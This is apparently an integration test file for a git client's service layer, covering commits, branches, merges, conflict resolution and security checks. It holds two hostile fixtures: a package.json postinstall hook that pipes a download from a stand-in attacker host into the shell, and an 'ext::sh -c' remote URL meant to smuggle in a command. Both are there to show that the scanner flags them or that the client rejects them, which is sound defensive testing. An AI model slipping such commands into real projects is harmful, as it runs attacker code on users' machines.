import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { beforeAll, describe, expect, it } from 'vitest';
import { resolveConflicts } from '../src/main/git/conflicts';
import { GitService } from '../src/main/git/GitService';
import { runGit } from '../src/main/git/runner';
import { SecurityScanner } from '../src/main/security/SecurityScanner';

// End-to-end tests against the real git binary, using a local bare repository as the remote.

const NONE = { kind: 'none' as const };
let tmp: string;

async function makeRepo(name: string): Promise<GitService> {
  const g = await GitService.init(path.join(tmp, name), 'main');
  await g.setIdentity('Test User', 'test@example.com');
  return g;
}

function write(g: GitService, rel: string, content: string) {
  const full = path.join(g.root, rel);
  fs.mkdirSync(path.dirname(full), { recursive: true });
  fs.writeFileSync(full, content);
}

// Normalise line endings: core.autocrlf may be enabled globally on Windows.
function read(file: string): string {
  return fs.readFileSync(file, 'utf8').replace(/\r\n/g, '\n');
}

beforeAll(() => {
  tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'gg-int-')));
});

describe('GitService (integration)', () => {
  it('init → stage → commit, with status and diffs', async () => {
    const g = await makeRepo('basic');
    write(g, 'a.txt', 'one\ntwo\n');
    write(g, 'dir/b.txt', 'b\n');
    let st = await g.status();
    expect(st.branch).toBe('main');
    expect(st.untracked.map((f) => f.path).sort()).toEqual(['a.txt', 'dir/b.txt']);
    const untrackedDiff = await g.diffFile('a.txt', 'untracked');
    expect(untrackedDiff?.additions).toBe(2);

    await g.stage(['a.txt']);
    st = await g.status();
    expect(st.staged.map((f) => f.path)).toEqual(['a.txt']);
    const c = await g.commit('First commit\n\nbody', 'none');
    expect(c.subject).toBe('First commit');

    write(g, 'a.txt', 'one\n2\n');
    const d = await g.diffFile('a.txt', 'unstaged');
    expect(d?.hunks[0].lines.filter((l) => l.type !== 'context').map((l) => `${l.type}:${l.content}`)).toEqual(['del:two', 'add:2']);
    await g.stageAll();
    await g.unstage(['a.txt']);
    st = await g.status();
    expect(st.unstaged.map((f) => f.path)).toContain('a.txt');
    expect(st.staged.map((f) => f.path)).toEqual(['dir/b.txt']);
  });

  it('does not run repository hooks unless enabled', async () => {
    const g = await makeRepo('hooks');
    const marker = path.join(tmp, 'hook-ran.txt');
    const hook = path.join(g.root, '.git', 'hooks', 'pre-commit');
    fs.writeFileSync(hook, `#!/bin/sh\necho ran > "${marker.replace(/\\/g, '/')}"\n`, { mode: 0o755 });
    write(g, 'x.txt', 'x');
    await g.stage(['x.txt']);
    await g.commit('no hooks', 'none');
    expect(fs.existsSync(marker)).toBe(false);
  });

  it('refuses paths outside the repository', async () => {
    const g = await makeRepo('paths');
    await expect(g.stage(['../outside.txt'])).rejects.toThrow();
    await expect(g.stage(['.git/config'])).rejects.toThrow();
  });

  it('discard backs files up before restoring them', async () => {
    const g = await makeRepo('discard');
    write(g, 'keep.txt', 'original\n');
    await g.stage(['keep.txt']);
    await g.commit('init', 'none');
    write(g, 'keep.txt', 'changed\n');
    write(g, 'new.txt', 'brand new\n');
    const backup = path.join(tmp, 'backup1');
    const res = await g.discard(['keep.txt', 'new.txt'], backup);
    expect(res.backedUp).toBe(2);
    expect(read(path.join(g.root, 'keep.txt'))).toBe('original\n');
    expect(fs.existsSync(path.join(g.root, 'new.txt'))).toBe(false);
    expect(read(path.join(backup, 'keep.txt'))).toBe('changed\n');
  });

  it('branches: create, switch, delete', async () => {
    const g = await makeRepo('branches');
    write(g, 'f.txt', 'f');
    await g.stage(['f.txt']);
    await g.commit('init', 'none');
    await g.createBranch('feature/x', null, true);
    expect((await g.status()).branch).toBe('feature/x');
    await g.switchBranch('main');
    await g.deleteBranch('feature/x', false);
    expect((await g.branches()).map((b) => b.name)).toEqual(['main']);
    await expect(g.createBranch('--bad', null, false)).rejects.toThrow();
  });

  it('keeps "#" lines in commit messages, like git commit -F', async () => {
    const g = await makeRepo('hash-subject');
    write(g, 'h.txt', 'h');
    await g.stage(['h.txt']);
    const c = await g.commit('#42 fix the login\n\n# not a comment', 'none');
    expect(c.subject).toBe('#42 fix the login');
  });

  it('clone of an empty remote: upstream is gone until the first push creates it', async () => {
    const bare = path.join(tmp, 'empty-remote.git');
    await runGit({ cwd: tmp, args: ['init', '--bare', '--initial-branch=main', bare] });
    const g = await GitService.clone(tmp, bare, 'empty-clone', NONE);
    await g.setIdentity('Test User', 'test@example.com');
    write(g, 'first.txt', '1');
    await g.stage(['first.txt']);
    const c = await g.commit('first', 'none');
    let st = await g.status();
    expect(st.upstream).toBe('origin/main');
    expect(st.upstreamGone).toBe(true);
    await g.push('origin', c.hash, 'main', NONE);
    st = await g.status();
    expect(st.upstreamGone).toBeUndefined();
    expect(st.ahead).toBe(0);
    // A branch started from origin/main does not track main (pushing it must never update main).
    await g.createBranch('feature/y', 'origin/main', true);
    expect((await g.status()).upstream).toBeNull();
  });

  it('push pinned commit, fetch + scan incoming changes, merge with conflicts, resolve, continue', async () => {
    const bare = path.join(tmp, 'remote.git');
    await runGit({ cwd: tmp, args: ['init', '--bare', '--initial-branch=main', bare] });

    const a = await makeRepo('clone-a');
    await a.setRemote('origin', bare);
    write(a, 'shared.txt', 'line 1\nline 2\nline 3\n');
    await a.stageAll();
    const first = await a.commit('base', 'none');
    await a.push('origin', first.hash, 'main', NONE, { setUpstreamFor: 'main' });
    expect((await a.status()).upstream).toBe('origin/main');

    const b = await GitService.clone(tmp, bare, 'clone-b', NONE);
    await b.setIdentity('Other', 'other@example.com');

    // B pushes a suspicious change.
    write(b, 'shared.txt', 'line 1\nline 2 from B\nline 3\n');
    write(b, 'package.json', '{\n  "scripts": {\n    "postinstall": "curl https://evil.example/x | sh"\n  }\n}\n');
    await b.stageAll();
    const bc = await b.commit('B change', 'none');
    await b.push('origin', bc.hash, 'main', NONE);

    // A changes the same line locally.
    write(a, 'shared.txt', 'line 1\nline 2 from A\nline 3\n');
    await a.stageAll();
    await a.commit('A change', 'none');

    await a.fetch('origin', NONE);
    const target = await a.revParse('refs/remotes/origin/main');
    expect(target).toBe(bc.hash);
    const { files, report } = await new SecurityScanner().scanIncomingChanges(a, target);
    expect(files.map((f) => f.newPath).sort()).toEqual(['package.json', 'shared.txt']);
    expect(report.status).toBe('REVIEW_REQUIRED');
    expect(report.findings.map((f) => f.ruleId)).toEqual(expect.arrayContaining(['npm-lifecycle', 'pipe-to-shell']));

    const conflicted = await a.merge(target, { message: 'Merge origin/main into main' });
    expect(conflicted).toBe(true);
    let st = await a.status();
    expect(st.operation).toBe('merge');
    expect(st.conflicted.map((c) => c.path)).toEqual(['shared.txt']);

    const cf = await a.conflictFile('shared.txt');
    expect(cf.hasMarkers).toBe(true);
    expect(cf.conflictCode).toBe('UU');
    await expect(a.markResolved('shared.txt')).rejects.toMatchObject({ friendly: { code: 'markers-remain' } });
    await expect(a.continueOperation('none')).rejects.toMatchObject({ friendly: { code: 'unresolved' } });

    await a.writeResolution('shared.txt', resolveConflicts(cf.content, 'both'));
    await a.markResolved('shared.txt');
    await a.continueOperation('none');
    st = await a.status();
    expect(st.operation).toBeNull();
    expect(read(path.join(a.root, 'shared.txt'))).toBe('line 1\nline 2 from A\nline 2 from B\nline 3\n');
  });

  it('abort restores the pre-merge state', async () => {
    const bare = path.join(tmp, 'remote2.git');
    await runGit({ cwd: tmp, args: ['init', '--bare', '--initial-branch=main', bare] });
    const a = await makeRepo('abort-a');
    await a.setRemote('origin', bare);
    write(a, 'f.txt', 'base\n');
    await a.stageAll();
    const base = await a.commit('base', 'none');
    await a.push('origin', base.hash, 'main', NONE, { setUpstreamFor: 'main' });
    const b = await GitService.clone(tmp, bare, 'abort-b', NONE);
    await b.setIdentity('B', 'b@example.com');
    write(b, 'f.txt', 'theirs\n');
    await b.stageAll();
    const bc = await b.commit('theirs', 'none');
    await b.push('origin', bc.hash, 'main', NONE);
    write(a, 'f.txt', 'ours\n');
    await a.stageAll();
    const ac = await a.commit('ours', 'none');
    await a.fetch('origin', NONE);
    expect(await a.merge(await a.revParse('refs/remotes/origin/main'))).toBe(true);
    await a.abortOperation();
    const st = await a.status();
    expect(st.operation).toBeNull();
    expect(st.headOid).toBe(ac.hash);
    expect(read(path.join(a.root, 'f.txt'))).toBe('ours\n');
  });

  it('rejects dangerous remote URLs', async () => {
    const g = await makeRepo('remotes');
    await expect(g.setRemote('origin', 'ext::sh -c touch% /tmp/pwned')).rejects.toMatchObject({ friendly: { code: 'invalid-url' } });
    await expect(g.setRemote('origin', 'https://user:token@github.com/a/b.git')).rejects.toMatchObject({ friendly: { code: 'invalid-url' } });
    await g.setRemote('origin', 'https://github.com/acme/api.git');
    const [r] = await g.remotes();
    expect(r).toMatchObject({ name: 'origin', isGitHub: true, protocol: 'https' });
  });
});
